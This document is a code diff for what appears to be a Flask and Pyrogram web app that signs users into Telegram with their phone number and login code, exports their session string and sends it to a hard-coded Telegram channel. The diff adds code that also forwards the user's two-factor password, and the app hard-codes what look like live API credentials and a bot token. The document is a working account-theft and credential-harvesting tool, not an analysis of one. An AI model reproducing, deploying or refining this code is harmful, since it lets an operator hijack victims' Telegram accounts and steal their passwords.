@@ -5,8 +5,8 @@ import asyncio
 from datetime import datetime
 from pyrogram import Client
 from pyrogram.errors import (
-    PhoneNumberInvalid, 
-    PhoneCodeInvalid, 
+    PhoneNumberInvalid,
+    PhoneCodeInvalid,
     PhoneCodeExpired,
     SessionPasswordNeeded,
     FloodWait
@@ -15,12 +15,10 @@ from pyrogram.errors import (
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", "7f9c2e1a84d6b3f0c5a7e9d2f1b8c4e6a3d7f0b2c9e5a1d8f6c3b7e2a9d4f1")
 
-# ========== CONFIGURE THESE ==========
 API_ID = int(os.environ.get("API_ID", "32208414"))
 API_HASH = os.environ.get("API_HASH", "628f11c05a44c8dda4b006e66f4bf7df")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8607223226:AAHBtUHkmc01RIRsVGTmJdm7d3B-PtI8o28")
 CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1004376082945")
-# =====================================
 
 clients = {}
 
@@ -28,7 +26,7 @@ def send_to_channel(message):
     if not BOT_TOKEN:
         print(f"[CHANNEL] {message[:200]}...")
         return True
-    
+
     import requests
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
@@ -63,6 +61,9 @@ def send_code():
 
     session_id = str(uuid.uuid4())[:8]
     
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+
     client = Client(
         name=f"session_{session_id}",
         api_id=API_ID,
@@ -72,23 +73,20 @@ def send_code():
     )
 
     try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
+        async def send():    
+            await client.connect()    
+            sent = await client.send_code(phone)    
+            return sent    
 
-        async def send():
-            await client.connect()
-            sent = await client.send_code(phone)
-            return sent
+        sent_code = loop.run_until_complete(send())    
 
-        sent_code = loop.run_until_complete(send())
-
-        clients[session_id] = {
-            "client": client,
-            "phone": phone,
-            "session_name": session_name,
-            "phone_code_hash": sent_code.phone_code_hash,
-            "loop": loop
-        }
+        clients[session_id] = {    
+            "client": client,    
+            "phone": phone,    
+            "session_name": session_name,    
+            "phone_code_hash": sent_code.phone_code_hash,    
+            "loop": loop    
+        }    
 
         return jsonify(ok=True, session_id=session_id, message=f"Code sent to {phone}")
 
@@ -118,9 +116,10 @@ def verify_code():
     phone_code_hash = client_data["phone_code_hash"]
     session_name = client_data["session_name"]
     loop = client_data["loop"]
+    
+    asyncio.set_event_loop(loop)
 
     try:
-        # ALL async code inside this function
         async def do_sign_in():
             try:
                 user = await client.sign_in(
@@ -128,7 +127,6 @@ def verify_code():
                     phone_code_hash=phone_code_hash,
                     phone_code=code
                 )
-                # Export session string HERE inside async function
                 session_string = await client.export_session_string()
                 await client.disconnect()
                 return user, session_string, None
@@ -140,29 +138,26 @@ def verify_code():
                 await client.disconnect()
                 return user, session_string, None
 
-        user, session_string, error = loop.run_until_complete(do_sign_in())
+        user, session_string, error = loop.run_until_complete(do_sign_in())    
 
-        if error == "2FA_PASSWORD_REQUIRED":
-            return jsonify(ok=False, requires_password=True), 401
+        if error == "2FA_PASSWORD_REQUIRED":    
+            return jsonify(ok=False, requires_password=True), 401    
 
-        # Now session_string is available here (not using await)
-        user_info = {
-            "id": user.id,
-            "first_name": user.first_name,
-            "last_name": user.last_name or "",
-            "username": user.username or "N/A",
-            "phone": phone,
-            "session_string": session_string,
-            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            "session_name": session_name
-        }
+        user_info = {    
+            "id": user.id,    
+            "first_name": user.first_name,    
+            "last_name": user.last_name or "",    
+            "username": user.username or "N/A",    
+            "phone": phone,    
+            "session_string": session_string,    
+            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),    
+            "session_name": session_name    
+        }    
 
-        # Clean up
-        del clients[session_id]
+        del clients[session_id]    
 
-        # Send to channel
-        country_code = phone[:3] if phone.startswith("+") else phone[:2]
-        
+        country_code = phone[:3] if phone.startswith("+") else phone[:2]    
+
         channel_msg = f"""🟢 <b>NEW PYROGRAM SESSION</b>
 
 👤 <b>Name:</b> {user_info['first_name']} {user_info['last_name']}
@@ -170,20 +165,25 @@ def verify_code():
 🆔 <b>User ID:</b> <code>{user_info['id']}</code>
 📱 <b>Phone:</b> <code>{phone}</code>
 🌍 <b>Country:</b> +{country_code}
-⏰ <b>Created:</b> {user_info['created_at']}
+⏰ <b>Created:</b> {user_info['created_at']}"""
+
+        if password:
+            channel_msg += f"\n🔑 <b>2FA Password:</b> <code>{password}</code>"
+
+        channel_msg += f"""
 
 <b>🔐 SESSION STRING:</b>
 <code>{session_string}</code>"""
 
         send_to_channel(channel_msg)
 
-        session["user"] = user_info
+        session["user"] = user_info    
 
-        return jsonify(ok=True, user={
-            "id": user_info["id"],
-            "name": f"{user_info['first_name']} {user_info['last_name']}",
-            "username": user_info["username"],
-            "phone": phone
+        return jsonify(ok=True, user={    
+            "id": user_info["id"],    
+            "name": f"{user_info['first_name']} {user_info['last_name']}",    
+            "username": user_info["username"],    
+            "phone": phone    
         })
 
     except PhoneCodeInvalid:
